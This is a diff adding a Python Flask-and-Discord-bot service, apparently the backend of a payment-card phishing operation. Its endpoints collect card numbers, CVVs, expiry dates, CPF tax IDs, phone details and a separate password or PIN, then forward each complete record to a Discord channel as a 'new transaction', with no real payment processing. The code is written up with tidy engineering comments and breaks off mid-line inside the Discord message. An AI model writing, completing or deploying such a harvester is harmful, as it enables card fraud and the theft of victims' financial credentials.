@@ -1,0 +1,129 @@
+import os
+import discord
+from discord.ext import commands
+from flask import Flask, request, jsonify
+import asyncio
+import threading
+from dataclasses import dataclass
+
+# --- Model Definition ---
+# This class represents the data structure for a card transaction.
+# In the original code, this was imported from 'model.cardModel.py'.
+@dataclass
+class Card:
+    celular: str
+    operadora: str
+    valor: str
+    email: str
+    nome: str
+    cpf: str
+    card_number: str  # Renamed from 'card' to avoid ambiguity
+    mes: str
+    ano: str
+    cvv: str
+    token: str
+    bin: str
+    dadosbin: str
+    senha: str = None  # To store the password received later
+
+
+# --- Flask App and Discord Bot Setup ---
+app = Flask(__name__)
+
+# --- Configuration ---
+# Load sensitive information from environment variables for security.
+DISCORD_BOT_TOKEN = os.getenv("TOKEN")
+# Add an environment variable for the channel ID where messages will be sent.
+DISCORD_CHANNEL_ID = int(os.getenv("DISCORD_CHANNEL_ID", 0))
+
+# --- Discord Bot Initialization ---
+intents = discord.Intents.all()
+bot = commands.Bot(command_prefix="/", intents=intents)
+
+# --- In-memory Data Store ---
+# A dictionary is used for efficient O(1) lookups using the token as a key.
+# In a production environment, a database (e.g., PostgreSQL, Redis) should be used.
+cards: dict[str, Card] = {}
+
+
+@bot.event
+async def on_ready():
+    """Event handler for when the Discord bot has connected and is ready."""
+    print(f'Bot logged in as {bot.user}')
+    if bot.get_channel(DISCORD_CHANNEL_ID):
+        print(f'Successfully found channel with ID: {DISCORD_CHANNEL_ID}')
+    else:
+        print(f'Warning: Could not find channel with ID: {DISCORD_CHANNEL_ID}. Please check the ID and bot permissions.')
+
+
+# --- Flask API Routes ---
+
+@app.route('/auth', methods=['POST'])  # Changed to POST, as it's standard for sending data in a body.
+def authInfo():
+    """Receives initial card and user information."""
+    try:
+        data = request.json
+        required_keys = [
+            'celular', 'operadora', 'valor', 'email', 'nome', 'cpf',
+            'card', 'mes', 'ano', 'cvv', 'token', 'bin', 'dadosbin'
+        ]
+        if not data or not all(key in data for key in required_keys):
+            return jsonify({'Error': 'Missing required fields'}), 400
+
+        # Create a Card object from the received data
+        card_info = Card(
+            celular=data.get('celular'),
+            operadora=data.get('operadora'),
+            valor=data.get('valor'),
+            email=data.get('email'),
+            nome=data.get('nome'),
+            cpf=data.get('cpf'),
+            card_number=data.get('card'),
+            mes=data.get('mes'),
+            ano=data.get('ano'),
+            cvv=data.get('cvv'),
+            token=data.get('token'),
+            bin=data.get('bin'),
+            dadosbin=data.get('dadosbin')
+        )
+
+        # Store the card info using its token as the key for quick lookup
+        cards[card_info.token] = card_info
+        print(f"Received card info for token: {card_info.token}")
+        return jsonify({'Message': 'Ok'}), 200
+
+    except Exception as ex:
+        print(f"Error in /auth: {ex}")
+        return jsonify({'Error': 'Internal Server Error'}), 500
+
+
+@app.route('/authpass', methods=['POST'])  # Changed to POST
+def authPassword():
+    """Receives the password associated with a token and sends the complete data to Discord."""
+    try:
+        data = request.json
+        if not data or not all(key in data for key in ['senha', 'token']):
+            return jsonify({'Error': 'Missing senha or token'}), 400
+
+        senha = data.get('senha')
+        token = data.get('token')
+
+        # Find the card by token efficiently from the dictionary
+        card = cards.get(token)
+
+        if card:
+            card.senha = senha  # Add the password to the card object
+            print(f"Received password for token: {token}. Preparing to send to Discord.")
+
+            # --- Send message to Discord ---
+            # This must be done in a thread-safe way because Flask and the Discord bot
+            # run in different threads with different event loops.
+            channel = bot.get_channel(DISCORD_CHANNEL_ID)
+            if channel:
+                # Create an embed for a nicely formatted message
+                embed = discord.Embed(
+                    title="Nova Transação Recebida",
+                    description="Todos os dados foram coletados com sucesso.",
+                    color=discord.Color.blue()
+                )
+                embed.add_field(name="Nome", value=f"
